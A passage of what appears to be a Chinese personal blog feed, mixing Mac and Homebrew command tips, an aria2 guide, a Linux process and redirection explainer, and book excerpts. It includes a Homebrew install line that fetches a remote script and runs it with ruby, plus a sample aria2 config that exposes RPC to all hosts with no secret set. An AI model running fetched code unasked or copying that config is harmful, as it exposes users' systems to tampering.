    <content type="html"><![CDATA[<h3 id="Mac命令行指定特定程序打开文件-a"><a href="#Mac命令行指定特定程序打开文件-a" class="headerlink" title="Mac命令行指定特定程序打开文件 -a"></a>Mac命令行指定特定程序打开文件 -a</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">open -a &#x2F;Applications&#x2F;Sublime\ Text.app&#x2F; httpd.conf</code></pre></div><h3 id="brew-Permission-Denied-问题解决"><a href="#brew-Permission-Denied-问题解决" class="headerlink" title="brew Permission Denied 问题解决"></a>brew <strong>Permission Denied</strong> 问题解决</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo chown -R $(whoami) &#x2F;usr&#x2F;local</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>HomeBrew</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aria2与Homebrew简记</title>
    <link href="/posts/e8d82254/"/>
    <url>/posts/e8d82254/</url>
    
    <content type="html"><![CDATA[<h3 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h3><blockquote><p><a href="https://aria2.github.io/">aria2</a>是一个自由、开源、轻量级多协议和多源的命令行下载工具，它支持 HTTP/HTTPS、FTP、SFTP、 BitTorrent 和 Metalink 协议。</p><p>brew install aria2</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 下载单个文件（支持使用种子文件与磁力链接）aria2c https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 下载多个文件aria2c -Z https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2 https:&#x2F;&#x2F;y&#x2F;owncloud-9.0.0.tar.bz2# 另存文件名字aria2c -o owncloud.zip https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 续传未完成的下载（中断使用.aria2后缀保存文件，下次重启任务后续传）aria2c -c https:&#x2F;&#x2F;x&#x2F;owncloud-9.0.0.tar.bz2# 从文件获取输入（可传入URL列表）aria2c -i test-aria2.txt# 其他-D 后台下载--conf-path&#x3D;&quot;~&#x2F;.aria2&#x2F;aria2.conf&quot; 配置文件-s 设置线程数-max-download-limit 设置最大下载速度-x3 到服务器的连接数--http-user&#x3D;xxx --http-password&#x3D;xxx http密码下载--ftp-user&#x3D;xxx --ftp-password&#x3D;xxx ftp密码下载</code></pre></div><p>配置文件可参考：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#用户名#rpc-user&#x3D;user#密码#rpc-passwd&#x3D;passwd#上面的认证方式不建议使用,建议使用下面的token方式#设置加密的密钥#rpc-secret&#x3D;token#允许rpcenable-rpc&#x3D;true#允许所有来源, web界面跨域权限需要rpc-allow-origin-all&#x3D;true#允许外部访问，false的话只监听本地端口rpc-listen-all&#x3D;true#RPC端口, 仅当默认端口被占用时修改#rpc-listen-port&#x3D;6800#最大同时下载数(任务数), 路由建议值: 3max-concurrent-downloads&#x3D;5#断点续传continue&#x3D;true#同服务器连接数max-connection-per-server&#x3D;5#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要min-split-size&#x3D;10M#单文件最大线程数, 路由建议值: 5split&#x3D;10#下载速度限制max-overall-download-limit&#x3D;0#单文件速度限制max-download-limit&#x3D;0#上传速度限制max-overall-upload-limit&#x3D;0#单文件速度限制max-upload-limit&#x3D;0#断开速度过慢的连接#lowest-speed-limit&#x3D;0#验证用，需要1.16.1之后的release版本#referer&#x3D;*#文件保存路径, 默认为当前启动位置dir&#x3D;&#x2F;Users&#x2F;xxx&#x2F;Downloads#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本#disk-cache&#x3D;0#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)#enable-mmap&#x3D;true#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持file-allocation&#x3D;prealloc</code></pre></div><p>设置WebUI可参考<a href="https://ziahamza.github.io/webui-aria2/">链接</a>。</p><h3 id="HomeBrew"><a href="#HomeBrew" class="headerlink" title="HomeBrew"></a>HomeBrew</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">## 管理HomeBrew# 安装 HomeBrew&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;# 卸载 HomeBrewruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;uninstall)&quot;# 更新 HomeBrewbrew update# 检视HomeBrewbrew doctor## 管理软件# 安装卸载更新软件brew install wgetbrew uninstall wgetbrew uograde wget# 列出安装的软件brew list# 列出安装的软件信息brew info wget# 检查软件库brew search wget## 管理服务# 列出服务brew services list# 注销未使用服务brew services cleanup# 运行服务（不注册为跟随系统启动）brew services run nginx# 运行后台服务（注册为跟随系统启动）brew services start nginx# 暂停并注销服务brew services stop nginx# 重启并注册服务brew services restart nginx</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://wild-flame.github.io/guides/docs/mac-os-x-setup-guide/aria_2/readme">https://wild-flame.github.io/guides/docs/mac-os-x-setup-guide/aria_2/readme</a></p><p><a href="https://www.linuxprobe.com/aria2-download.html">https://www.linuxprobe.com/aria2-download.html</a></p><p><a href="https://segmentfault.com/a/1190000018928643">https://segmentfault.com/a/1190000018928643</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>aria2</tag>
      
      <tag>Homebrew</tag>
      
      <tag>Terminal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《史蒂夫·乔布斯传》摘录</title>
    <link href="/posts/eed80891/"/>
    <url>/posts/eed80891/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《史蒂夫·乔布斯传》沃尔特·艾萨克森</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>一个具有强烈个性的人身上集合了人文和科学的天赋后所能产生的那种创造力，我相信这种创造力也是在21世纪建立创新型经济的关键因素。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>“有些人认为，因为我被亲生父母抛弃过，所以我非常努力地工作以求出人头地，这样我父母就会后悔当初的决定，还有一些类似的言论，都太荒谬了。”他坚称，“知道自己是被领养的也许让我感觉更加独立，但我从未感觉自己被抛弃过。我一直都觉得自己很特别。我的父母让我觉得自己很特别。”之后，每当有人称保罗和克拉拉为乔布斯的”养父母“或者暗示他俩不是他的”亲生父母“时，乔布斯就会异常愤怒。”他们百分之一千是我的父母。“他说。另一方面，当谈及他的亲生父母时，他显得很草率：“他们就是我的精子库和卵子库，这话并不过分，因为这就是事实，他们扮演的就是精子库的角色，仅此而已。”</p><blockquote><p>生活中确有的亲情，在内心的感受上要比血脉的相连来的更为直接。</p><p>或许随着年龄的生长才会越加注意血脉带来的感受吧。</p></blockquote><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>​        宗教应该更多地强调精神体验，而不是一味遵守教条。“<strong>当基督教太过基于信仰，而忽略了以耶稣的生活方式或者从耶稣的角度看世界时，他的精髓就消失了，</strong>”他告诉我，“我觉得不同的宗教就好比通往同一栋房子的不同的门。有时候我觉得这栋房子存在，有时候我又觉得它不存在。这是最神秘的。”</p><h3 id="4"><a href="#4" class="headerlink" title="# 4"></a># 4</h3><p><strong>求知若饥，虚心若愚。</strong></p><p><strong>Stay hungry, Stay foolish.</strong></p><h3 id="5"><a href="#5" class="headerlink" title="# 5"></a># 5</h3><p>苦行和极简将会让人更加敏锐。“他相信匮乏即是富足，自律产生喜悦。”她说，“他知道一个大多数人不知道的道理：物极必反。”</p><h3 id="6"><a href="#6" class="headerlink" title="# 6"></a># 6</h3><p><strong>简洁并不仅仅是视觉上的，也不仅仅是把杂乱无章的东西变少或者抹掉，而是要挖掘复杂性的深度。</strong>要想获得简洁，你就必须要挖的足够深。打个比方，如果你是为了在产品上不装螺丝钉，那你最后可能会造出一个极其繁琐复杂的东西。<strong>更好的方式，是更深刻地理解“简洁”一词，理解他的每一个部分，以及它是如何制造的。你必须深刻的把握产品的精髓，从而判断出哪些不重要的部件是可以拿掉的。</strong></p><h3 id="7"><a href="#7" class="headerlink" title="# 7"></a># 7</h3><p><strong>记住自己很快就要死了，这是我面对人生重大选择时最重要的工具。因为，几乎一切——所有外界的期望，所有骄傲，所有对于困窘和失败的恐惧——这些东西都在死亡面前烟消云散，只留下真正重要的东西。记住自己终会死去，是我所知最好的方式，避免陷入认为自己会失去什么的陷阱。你已是一无所有，没理由不追随内心。</strong></p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摘录</tag>
      
      <tag>史蒂夫·乔布斯</tag>
      
      <tag>沃尔特·艾萨克森</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS清除DNS缓存</title>
    <link href="/posts/8ea63c18/"/>
    <url>/posts/8ea63c18/</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo killall -HUP mDNSRespondersudo killall mDNSResponderHelpersudo dscacheutil -flushcache</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《假面山庄》摘录</title>
    <link href="/posts/ff70973a/"/>
    <url>/posts/ff70973a/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《假面山庄》东野圭吾</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>人在谈论别人的事时，都能保持冷静，一旦遇到和自己密切相关的事，就会突然感情用事，难以决断。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>大部分人在痛苦面前都会选择放弃。一旦身处困境，首先想的就是逃避，要不就是自暴自弃、萎靡不振，把自己当成悲剧的主人公。</p><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>我希望自己对人人都好，但我这么对你，并不单单是这个原因。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>假面山庄</tag>
      
      <tag>东野圭吾</tag>
      
      <tag>摘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux:进程与线程、文件描述符与重定向(补)</title>
    <link href="/posts/991f3e43/"/>
    <url>/posts/991f3e43/</url>
    
    <content type="html"><![CDATA[<h3 id="Q1：与Windows下进程线程区别？"><a href="#Q1：与Windows下进程线程区别？" class="headerlink" title="Q1：与Windows下进程线程区别？"></a>Q1：与Windows下进程线程区别？</h3><p>Windows中<code>进程</code>只是作为<strong>资源的拥有者</strong>，并不是实际任务的执行者，<strong>实际的执行</strong>靠<code>线程</code>实现。</p><p>一个进程可以拥有多个线程，多个线程共享进程拥有的资源，同时可能具有自己的独占资源。在具体执行任务时由线程来使用处理机。 </p><p>Windows中，进程实现靠createProcess实现。而createProcess有一大堆的参数，不过很多时候都默认为null。其作用相当于创建一个进程的同时创建一个线程（一般一个）。</p><p>而Linux中<strong>在 Linux 系统中，进程和线程几乎没有区别</strong>。</p><p>进程和线程都是实际运行的存在，都有一个类似的进程描述符（而Windows中线程不具有进程描述符，只描述一些少量的独有资源，所以很轻量）。</p><p><em>线程看起来跟进程没有区别，只是线程的某些数据区域和其父进程是共享的，而子进程是拷贝副本，而不是共享</em>。</p><h3 id="Q2：如何理解Linux-shell中的“2-gt-amp-1”？"><a href="#Q2：如何理解Linux-shell中的“2-gt-amp-1”？" class="headerlink" title="Q2：如何理解Linux shell中的“2&gt;&amp;1”？"></a>Q2：如何理解Linux shell中的“2&gt;&amp;1”？</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.&#x2F;test.sh  &gt; log.txt 2&gt;&amp;1</code></pre></div><p>上面的调用表明将<code>./test.sh</code>的输出重定向到<code>log.txt</code>文件中，同时将标准错误也重定向到<code>log.txt</code>文件中。</p><p>每个程序在运行后，都会至少打开三个文件描述符，分别是0：标准输入；1：标准输出；2：标准错误。例如，对于前面的test.sh脚本它至少打开了三个文件描述符（可以在<code>/proc/&lt;pid&gt;/fd</code>目录下查到）。</p><p>那么现在就容易理解前面的疑问了，<code>2&gt;&amp;1</code>表明将文件描述2（标准错误输出）的内容重定向到文件描述符1（标准输出），为什么1前面需要&amp;？当没有&amp;时，1会被认为是一个普通的文件，<strong>有&amp;表示重定向的目标不是一个文件，而是一个文件描述符</strong>。在前面我们知道，test.sh &gt;log.txt又将文件描述符1的内容重定向到了文件log.txt，那么最终标准错误也会重定向到log.txt。</p><p>可以在<code>/proc/&lt;pid&gt;/fd</code>目录下查到重定向的情况文件，<strong>文件描述符1和2都指向了log.txt文件，</strong>也就得到了我们最终想要的效果：<strong>将标准错误输出重定向到文件中</strong>。</p><blockquote><p>程序运行后会打开三个文件描述符，分别是标准输入，标准输出和标准错误输出。</p><p>在调用脚本时，可使用2&gt;&amp;1来将标准错误输出重定向。</p><p>只需要查看脚本的错误时，可将标准输出重定向到文件，而标准错误会打印在控制台，便于查看。</p><p><code>&gt;&gt;log.txt</code>会将重定向内容追加到log.txt文件末尾。</p><p>通过查看<code>/proc/&lt;pid&gt;/fd</code>下的内容，可了解进程打开的文件描述符信息。</p></blockquote><h3 id="Q3：为什么command-gt-file-2-gt-amp-1-不可以？"><a href="#Q3：为什么command-gt-file-2-gt-amp-1-不可以？" class="headerlink" title="Q3：为什么command &gt; file 2&gt;&amp;1 不可以？"></a>Q3：为什么<code>command &gt; file 2&gt;&amp;1 </code>不可以？</h3><ul><li>对于<code>command &gt; file 2&gt;&amp;1</code>:</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 初始状态0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>首先是<code>command &gt; file</code>将标准输出重定向到<code>file</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># command &gt; file0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p><code>2&gt;&amp;1</code>是标准错误拷贝了标准输出的行为，也就是同样被重定向到<code>file</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; file</code></pre></div><p>最终结果就是标准输出和错误都被重定向到file中，正确。</p><ul><li>而对于<code>command 2&gt;&amp;1 &gt;file 2&gt;&amp;1</code>:</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 初始状态0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>首先是<code>2&gt;&amp;1</code>，<strong>标准错误拷贝了标准输出的行为，但此时标准输出还是在终端</strong>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p><code>&gt;file</code>后输出才被重定向到file，但标准错误仍然保持在终端。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>所以达不到标准错误输出重定向的效果。</p><hr><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/47765176">https://zhuanlan.zhihu.com/p/47765176</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>进程</tag>
      
      <tag>线程</tag>
      
      <tag>文件描述符</tag>
      
      <tag>重定向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux:进程与线程、文件描述符与重定向</title>
    <link href="/posts/a2b8485c/"/>
    <url>/posts/a2b8485c/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在使用重定向的过程中，对文件描述符有一些疑惑。学习过程中涉及到一些Linux下的进程线程知识。</p></blockquote><h2 id="1-Linux进程与线程"><a href="#1-Linux进程与线程" class="headerlink" title="1. Linux进程与线程"></a>1. Linux进程与线程</h2><blockquote><p>先说结论：<strong>在 Linux 系统中，进程和线程几乎没有区别</strong>。</p></blockquote><h3 id="1-1-Linux进程"><a href="#1-1-Linux进程" class="headerlink" title="1.1 Linux进程"></a>1.1 Linux进程</h3><p>抽象的来说，计算机即下图所示。</p><p><img src="/posts/a2b8485c/pro.jpg"></p><p>这个大的矩形表示计算机的<strong>内存空间</strong>，其中的小矩形代表<strong>进程</strong>，左下角的圆形表示<strong>磁盘</strong>，右下角的图形表示一些<strong>输入输出设备</strong>，比如鼠标键盘显示器等等。</p><p>另外，注意到内存空间被划分为了两块，上半部分表示<strong>用户空间</strong>，下半部分表示<strong>内核空间</strong>。</p><p>用户空间装着用户进程需要使用的资源，比如你在程序代码里开一个数组，这个数组肯定存在用户空间；内核空间存放内核进程需要加载的系统资源，这一些资源一般是不允许用户访问的。但是注意有的用户进程会共享一些内核空间的资源，比如一些动态链接库等等。</p><p>我们用 C 语言写一个 hello 程序，编译后得到一个可执行文件，在命令行运行就可以打印出一句 hello world，然后程序退出。在操作系统层面，就是新建了一个进程，这个进程将我们编译出来的可执行文件读入内存空间，然后执行，最后退出。</p><p><strong>你编译好的那个可执行程序只是一个文件</strong>，不是进程，可执行文件必须要载入内存，包装成一个进程才能真正跑起来。进程是要依靠操作系统创建的，每个进程都有它的固有属性，比如进程号（PID）、进程状态、打开的文件等等，进程创建好之后，读入你的程序，你的程序才被系统执行。</p><p>那么，操作系统是如何创建进程的呢？<strong>对于操作系统，进程就是一个数据结构</strong>，我们直接来看 Linux 的源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">struct task_struct &#123;    &#x2F;&#x2F; 进程状态    long              state;    &#x2F;&#x2F; 虚拟内存结构体    struct mm_struct  *mm;    &#x2F;&#x2F; 进程号    pid_t              pid;    &#x2F;&#x2F; 指向父进程的指针    struct task_struct __rcu  *parent;    &#x2F;&#x2F; 子进程列表    struct list_head        children;    &#x2F;&#x2F; 存放文件系统信息的指针    struct fs_struct        *fs;    &#x2F;&#x2F; 一个数组，包含该进程打开的文件指针    struct files_struct        *files;&#125;;</code></pre></div><p><code>task_struct</code>就是 Linux 内核对于一个进程的描述，也可以称为「进程描述符」。源码比较复杂，这里就截取了一小部分比较常见的。</p><p>其中比较有意思的是<code>mm</code>指针和<code>files</code>指针。<code>mm</code>指向的是进程的虚拟内存，也就是载入资源和可执行文件的地方；<code>files</code>指针指向一个数组，这个数组里装着所有该进程打开的文件的指针。</p><h3 id="1-2-Linux线程"><a href="#1-2-Linux线程" class="headerlink" title="1.2 Linux线程"></a>1.2 Linux线程</h3><p>为什么说 Linux 中线程和进程基本没有区别呢，因为从 Linux 内核的角度来看，并没有把线程和进程区别对待。</p><p>我们知道系统调用<code>fork()</code>可以新建一个子进程，函数<code>pthread()</code>可以新建一个线程。<strong>但无论线程还是进程，都是用<code>task_struct</code>结构表示的，唯一的区别就是共享的数据区域不同</strong>。</p><p>换句话说<em>，线程看起来跟进程没有区别，只是线程的某些数据区域和其父进程是共享的，而子进程是拷贝副本，而不是共享</em>。就比如说，<code>mm</code>结构和<code>files</code>结构在线程中都是共享的，可由下面两幅图看出：</p><p><img src="/posts/a2b8485c/thr1.jpg"></p><p><img src="/posts/a2b8485c/thr2.jpg"></p><p>所以说，我们的多线程程序要利用锁机制，避免多个线程同时往同一区域写入数据，否则可能造成数据错乱。</p><p>那么你可能问，<strong>既然进程和线程差不多，而且多进程数据不共享，即不存在数据错乱的问题，为什么多线程的使用比多进程普遍得多呢</strong>？</p><p>因为<strong>现实中数据共享的并发更普遍</strong>，比如十个人同时从一个账户取十元，我们希望的是这个共享账户的余额正确减少一百元，而不是希望每人获得一个账户的拷贝，每个拷贝账户减少十元。</p><p>当然，必须要说明的是，只有 Linux 系统将线程看做共享数据的进程，不对其做特殊看待，其他的很多操作系统是对线程和进程区别对待的，线程有其特有的数据结构，我个人认为不如 Linux 的这种设计简洁，增加了系统的复杂度。</p><p>在 Linux 中新建线程和进程的效率都是很高的，对于新建进程时内存区域拷贝的问题，Linux 采用了 copy-on-write 的策略优化，也就是并不真正复制父进程的内存空间，而是等到需要写操作时才去复制。<strong>所以 Linux 中新建进程和新建线程都是很迅速的</strong>。</p><h2 id="2-Linux文件描述符与重定向"><a href="#2-Linux文件描述符与重定向" class="headerlink" title="2. Linux文件描述符与重定向"></a>2. Linux文件描述符与重定向</h2><h3 id="2-1-文件描述符"><a href="#2-1-文件描述符" class="headerlink" title="2.1 文件描述符"></a>2.1 文件描述符</h3><p>在Linux源码对进程的描述中，具有一个<code>files</code>，它是一个文件指针数组。一般来说，一个进程会从<code>files[0]</code>读取输入，将输出写入<code>files[1]</code>，将错误信息写入<code>files[2]</code>。</p><p>举个例子，以我们的角度 C 语言的<code>printf</code>函数是向命令行打印字符，但是从进程的角度来看，就是向<code>files[1]</code>写入数据；同理，<code>scanf</code>函数就是进程试图从<code>files[0]</code>这个文件中读取数据。</p><p><strong>每个进程被创建时，</strong><code>files</code><strong>的前三位被填入默认值，分别指向标准输入流、标准输出流、标准错误流。我们常说的「文件描述符」就是指这个文件指针数组的索引</strong>，所以程序的文件描述符默认情况下 0 是输入，1 是输出，2 是错误。</p><p>可以重新画一幅图：</p><p><img src="/posts/a2b8485c/file1.jpg"></p><p>对于一般的计算机，输入流是键盘，输出流是显示器，错误流也是显示器，所以现在这个进程和内核连了三根线。因为硬件都是由内核管理的，我们的进程需要通过<em>「系统调用」</em>让内核进程访问硬件资源。</p><blockquote><p>不要忘了，Linux 中一切都被抽象成文件，设备也是文件，可以进行读和写。</p></blockquote><p>如果我们写的程序需要其他资源，比如打开一个文件进行读写，这也很简单，进行系统调用，让内核把文件打开，这个文件就会被放到<code>files</code>的第 4 个位置：</p><p><img src="/posts/a2b8485c/file2.jpg"></p><h3 id="2-2-重定向"><a href="#2-2-重定向" class="headerlink" title="2.2 重定向"></a>2.2 重定向</h3><p>明白了这个原理，<strong>输入重定向</strong>就很好理解了，程序想读取数据的时候就会去<code>files[0]</code>读取，所以我们只要把<code>files[0]</code>指向一个文件，那么程序就会从这个文件中读取数据，而不是从键盘：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ command &lt; file.txt</code></pre></div><p><img src="/posts/a2b8485c/file3.jpg"></p><p>同理，<strong>输出重定向</strong>就是把<code>files[1]</code>指向一个文件，那么程序的输出就不会写入到显示器，而是写入到这个文件中：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ command &gt; file.txt</code></pre></div><p><img src="/posts/a2b8485c/file4.jpg"></p><p>错误重定向也是一样的，就不再赘述。</p><p><strong>管道符</strong>其实也是异曲同工，把一个进程的输出流和另一个进程的输入流接起一条「管道」，数据就在其中传递，不得不说这种设计思想真的很优美：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cmd1 | cmd2 | cmd3</code></pre></div><p><img src="/posts/a2b8485c/pipe.jpg"></p><p>到这里，你可能也看出<em>「Linux 中一切皆文件」</em>设计思路的高明了，不管是设备、另一个进程、socket 套接字还是真正的文件，全部都可以读写，统一装进一个简单的<code>files</code>数组，进程通过简单的文件描述符访问相应资源，具体细节交于操作系统，有效解耦，优美高效。</p><hr><blockquote><p>参考：</p><p><a href="https://labuladong.gitbook.io/algo/di-wu-zhang-ji-shu-wen-zhang-xi-lie/linux-jin-cheng">https://labuladong.gitbook.io/algo/di-wu-zhang-ji-shu-wen-zhang-xi-lie/linux-jin-cheng</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>进程</tag>
      
      <tag>线程</tag>
      
      <tag>文件描述符</tag>
      
      <tag>重定向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS中Dock栏使用空白分隔</title>
    <link href="/posts/f3c59bf0/"/>
    <url>/posts/f3c59bf0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>给Mac的Dock栏添加空白的图标用以分隔。</p></blockquote><h2 id="添加空白分割区"><a href="#添加空白分割区" class="headerlink" title="添加空白分割区"></a>添加空白分割区</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock persistent-apps -array-add &#39;&#123;&quot;tile-type&quot;&#x3D;&quot;spacer-tile&quot;;&#125;&#39;; killall Dock</code></pre></div><ul><li><strong>空白区域就是个透明图标，可以移动位置或拖离Dock栏，重复上方指令可添加多个</strong></li></ul><h2 id="只显示当前运行的应用"><a href="#只显示当前运行的应用" class="headerlink" title="只显示当前运行的应用"></a>只显示当前运行的应用</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock static-only -bool TRUE; killall Dock</code></pre></div><ul><li><p><strong>想恢复原来状态，输入下列指令，按回车键运行即可：</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock static-only -bool FALSE; killall Dock</code></pre></div></li></ul><hr><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/190175194">https://zhuanlan.zhihu.com/p/190175194</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>Dock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《局外人》摘录</title>
    <link href="/posts/515d6e7b/"/>
    <url>/posts/515d6e7b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《局外人》阿尔贝·加缪</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>一个人对他所不了解的东西，总是会有一些夸张失真的想法。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>所有身心健康的人，都或多或少设想期待过自己所爱的人的死亡。</p><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>为什么一个普通人身上的优点，到了罪犯身上就成为了他十恶不赦的罪状。</p><h3 id="4"><a href="#4" class="headerlink" title="# 4"></a># 4</h3><p>我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摘录</tag>
      
      <tag>局外人</tag>
      
      <tag>阿尔贝·加缪</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第二章:字符串和文本(2)</title>
    <link href="/posts/dae8b75d/"/>
    <url>/posts/dae8b75d/</url>
    
    <content type="html"><![CDATA[<h4 id="2-10-在正则式中使用Unicode"><a href="#2-10-在正则式中使用Unicode" class="headerlink" title="2.10 在正则式中使用Unicode"></a>2.10 在正则式中使用Unicode</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 在正则式中使用Unicode&quot;&quot;&quot; 你可以使用Unicode字符对应的转义序列(比如 \uFFF 或者 \UFFFFFFF )&quot;&quot;&quot;import rearabic &#x3D; re.compile(&#39;[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff]+&#39;)</code></pre></div><h4 id="2-11-删除字符串中不需要的字符"><a href="#2-11-删除字符串中不需要的字符" class="headerlink" title="2.11 删除字符串中不需要的字符"></a>2.11 删除字符串中不需要的字符</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 删除字符串中不需要的字符&quot;&quot;&quot; strip() 方法能用于删除开始或结尾的字符。 lstrip() 和 rstrip() 分别从左和从右执行删除操作。 默认情况下，这些方法会去除空白字符，但是你也可以指定其他字符。&quot;&quot;&quot;# Whitespace strippings &#x3D; &#39; hello world \n&#39;s.strip()  # &#39;hello world&#39;s.lstrip()  # &#39;hello world \n&#39;s.rstrip()  # &#39; hello world&#39;# Character strippingt &#x3D; &#39;-----hello&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;t.lstrip(&#39;-&#39;)  # 